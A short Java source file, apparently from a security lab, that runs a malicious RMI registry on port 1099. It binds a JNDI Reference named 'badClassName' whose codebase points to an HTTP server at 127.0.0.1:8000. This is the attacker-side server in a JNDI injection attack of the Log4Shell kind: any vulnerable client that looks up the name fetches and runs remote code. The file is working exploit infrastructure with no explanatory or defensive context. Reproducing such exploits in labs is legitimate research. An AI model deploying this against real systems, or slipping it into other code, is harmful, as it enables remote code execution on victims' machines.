package org.sec;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMI {

    private static final Logger logger = LogManager.getLogger(RMI.class);

    public static void start() {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference aa = new Reference("badClassName", "badClassName", "http://127.0.0.1:8000/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
            logger.info("start rmi registry 0.0.0.0:1099");
            registry.bind("badClassName", refObjWrapper);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
